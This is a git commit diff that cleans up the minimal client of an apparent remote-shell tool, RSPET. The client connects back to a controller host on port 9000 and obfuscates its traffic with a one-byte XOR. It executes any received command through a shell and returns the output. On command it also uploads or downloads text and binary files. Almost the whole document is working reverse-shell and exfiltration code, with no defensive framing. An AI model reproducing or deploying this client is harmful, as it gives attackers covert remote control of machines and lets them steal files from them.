e70900e3220c182fb0b64d1c3a9ac01babc9b2d6
Kolokotronis Panagiotis <panos122008@gmail.com>
2016-04-30 18:13:27 +0300

    Update RSPET_client_min.py to v0.0.5a
    Code clean-up

--- min/RSPET_client_min.py
+++ min/RSPET_client_min.py
@@ -1,195 +1,164 @@
 #!/usr/bin/python
 
-import sys
-from subprocess import Popen, PIPE
 from socket import socket, SOCK_STREAM, AF_INET
+from subprocess import Popen, PIPE
+from sys import exit as sysexit, argv
 from time import sleep
-from multiprocessing import Process
 
-def make_en_STDOUT(STDOUT):
-	if STDOUT:
-		en_STDOUT = bytearray(STDOUT,'UTF-8')
-	else:
-		en_STDOUT = bytearray("Command not recognised",'UTF-8')
+def make_en_STDOUT(STDOUT,sock):
+	en_STDOUT = bytearray(STDOUT,'UTF-8')
 	for i in range(len(en_STDOUT)):
 		en_STDOUT[i] ^=0x41
-	return en_STDOUT
+	try:
+		sock.send(en_STDOUT)
+	except:
+		sock.close()
+		return 1
+	return 0
 
 def make_en_bin_STDOUT(STDOUT):
-	if STDOUT:
-		en_STDOUT = bytearray(STDOUT)
-	else:
-		en_STDOUT = bytearray("Command not recognised",'UTF-8')
-	for i in range(len(en_STDOUT)):
-		en_STDOUT[i] ^=0x41
-	return en_STDOUT
+    if STDOUT:
+        en_STDOUT = bytearray(STDOUT)
+    else:
+        en_STDOUT = bytearray("Command not recognised",'UTF-8')
+    for i in range(len(en_STDOUT)):
+        en_STDOUT[i] ^=0x41
+    return en_STDOUT
 
 def make_en_data(data):
-	en_data = bytearray(data)
-	for i in range(len(en_data)):
-		en_data[i] ^=0x41
-	return en_data.decode('UTF-8')
+    en_data = bytearray(data)
+    for i in range(len(en_data)):
+        en_data[i] ^=0x41
+    return en_data.decode('UTF-8')
 
 def make_en_bin_data(data):
-	en_data = bytearray(data)
-	for i in range(len(en_data)):
-		en_data[i] ^=0x41
-	return en_data
+    en_data = bytearray(data)
+    for i in range(len(en_data)):
+        en_data[i] ^=0x41
+    return en_data
+
+def get_en_data(sock, size):
+	data = sock.recv(size)
+	return make_en_data(data)
 
 def main():
 	try:
-		RHOST = sys.argv[1]
+		RHOST = argv[1]
 		RPORT = 9000
 	except:
 		print ("Must provide hotst")
-		sys.exit()
+		sysexit()
 	s = socket(AF_INET, SOCK_STREAM)
 	s.connect((RHOST,RPORT))
 
 	while True:
-		#recieve XOR encoded data
-		data = s.recv(2048)
-		
-		#XOR the data again with a '/x41' to get back to normal
-		en_data = make_en_data(data)
+		en_data = get_en_data(s,2048)
 		if en_data == 'killMe':
 			break
 		elif en_data == 'getFile':
-			print ("Started Transfer")
-			data = s.recv(2048)
-			en_data = make_en_data(data)
+			en_data = get_en_data(s,2048)
 			try:
 				fileToWrite = open(en_data,'w')
 				STDOUT = 'fcs'
 			except:
 				STDOUT = 'fna'
-			en_STDOUT = make_en_STDOUT(STDOUT)
-			try:
-				s.send(en_STDOUT)
-			except:
-                                s.close()
-				sys.exit()
+			en_STDOUT = make_en_STDOUT(STDOUT,s)
+			if en_STDOUT == 1:
+				sysexit()
 			if STDOUT == 'fna':
 				continue
-			fSize = s.recv(1024)
-			fSize = make_en_data(fSize)
-			data = s.recv(int(fSize))
-			en_data = make_en_data(data)
+			fSize = get_en_data(s,1024)
+			en_data = get_en_data(s,int(fSize))
 			fileToWrite.write(en_data)
 			fileToWrite.close()
 			STDOUT = "fsw"
-			en_STDOUT = make_en_STDOUT(STDOUT)
-			try:
-				s.send(en_STDOUT)
-			except:
-                                s.close()
-				sys.exit()
+			en_STDOUT = make_en_STDOUT(STDOUT,s)
+			if en_STDOUT == 1:
+				sysexit()
 		elif en_data == "getBinary":
-			data = s.recv(1024)
-			en_data = make_en_data(data)
+			en_data = get_en_data(s,1024)
 			try:
 				binToWrite = open(en_data,'wb')
 				STDOUT = 'fcs'
 			except:
 				STDOUT = 'fna'
-			en_STDOUT = make_en_STDOUT(STDOUT)
-			try:
-				s.send(en_STDOUT)
-			except:
-                                s.close()
-				sys.exit()
+			en_STDOUT = make_en_STDOUT(STDOUT,s)
+			if en_STDOUT == 1:
+				sysexit()
 			if STDOUT == 'fna':
 				continue
-			bSize = s.recv(1024)
-			bSize = make_en_data(bSize)
+			bSize = get_en_data(s,1024)
 			data = s.recv(int(bSize))
 			en_data = make_en_bin_data(data)
 			binToWrite.write(en_data)
 			binToWrite.close()
 			STDOUT = "fsw"
-			en_STDOUT = make_en_STDOUT(STDOUT)
-			try:
-				s.send(en_STDOUT)
-			except:
-                                s.close()
-				sys.exit()
+			en_STDOUT = make_en_STDOUT(STDOUT,s)
+			if en_STDOUT == 1:
+				sysexit()
 		elif en_data == "sendFile":
-			data = s.recv(1024)
-			en_data = make_en_data(data)
+			en_data = get_en_data(s,1024)
 			try:
 				fileToSend = open(en_data,'r')
 				STDOUT = 'fos'
 			except:
 				STDOUT = 'fna'
-			en_STDOUT = make_en_STDOUT(STDOUT)
-			try:
-				s.send(en_STDOUT)
-			except:
-                                s.close()
-				sys.exit()
+			en_STDOUT = make_en_STDOUT(STDOUT,s)
+			if en_STDOUT == 1:
+				sysexit()
 			if STDOUT == 'fna':
 				continue
 			fileCont = fileToSend.read()
+			sleep(0.1)
 			STDOUT = str(len(fileCont) + 1024)
-			en_STDOUT = make_en_STDOUT(STDOUT)
-			try:
-				s.send(en_STDOUT)
-			except:
-                                s.close()
-				sys.exit()
+			en_STDOUT = make_en_STDOUT(STDOUT,s)
+			if en_STDOUT == 1:
+				sysexit()
 			sleep(0.1)
 			STDOUT = fileCont
 			fileToSend.close()
-			en_STDOUT = make_en_STDOUT(STDOUT)
-			try:
-				s.send(en_STDOUT)
-			except:
-                                s.close()
-				sys.exit()
+			en_STDOUT = make_en_STDOUT(STDOUT,s)
+			if en_STDOUT == 1:
+				sysexit()
 		elif en_data == "sendBinary":
-			data = s.recv(1024)
-			en_data = make_en_data(data)
+			en_data = get_en_data(s,1024)
 			try:
 				binToSend = open(en_data,'rb')
 				STDOUT = 'fos'
 			except:
 				STDOUT = 'fna'
-			en_STDOUT = make_en_STDOUT(STDOUT)
-			try:
-				s.send(en_STDOUT)
-			except:
-                                s.close()
-				sys.exit()
+			en_STDOUT = make_en_STDOUT(STDOUT,s)
+			if en_STDOUT == 1:
+				sysexit()
 			if STDOUT == 'fna':
 				continue
 			binCont = binToSend.read()
 			binToSend.close()
 			STDOUT = str(len(binCont) + 1024)
-			en_STDOUT = make_en_STDOUT(STDOUT)
-			try:
-				s.send(en_STDOUT)
-			except:
-                                s.close()
-				sys.exit()
+			en_STDOUT = make_en_STDOUT(STDOUT,s)
+			if en_STDOUT == 1:
+				sysexit()
 			sleep(0.1)
 			STDOUT = binCont
 			en_STDOUT = make_en_bin_STDOUT(STDOUT)
 			try:
 				s.send(en_STDOUT)
 			except:
-                                s.close()
-				sys.exit()
+				s.close()
+				sysexit()
 		else:
 			comm = Popen(en_data, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
 			STDOUT,STDERR = comm.communicate()
-			en_STDOUT = make_en_STDOUT(STDOUT.decode('UTF-8'))
-			try:
-				s.send(en_STDOUT)
-			except:
-                                s.close()
-				sys.exit()
+			if STDERR:
+				en_STDOUT = make_en_STDOUT(STDERR.decode('UTF-8'),s)
+			elif STDOUT:
+				en_STDOUT = make_en_STDOUT(STDOUT.decode('UTF-8'),s)
+			else:
+				en_STDOUT = make_en_STDOUT('Command has no output',s)
+			if en_STDOUT == 1:
+				sysexit()
 	s.close()
 
 #Start Here!
 if __name__ == "__main__":
-	main()
+    main()
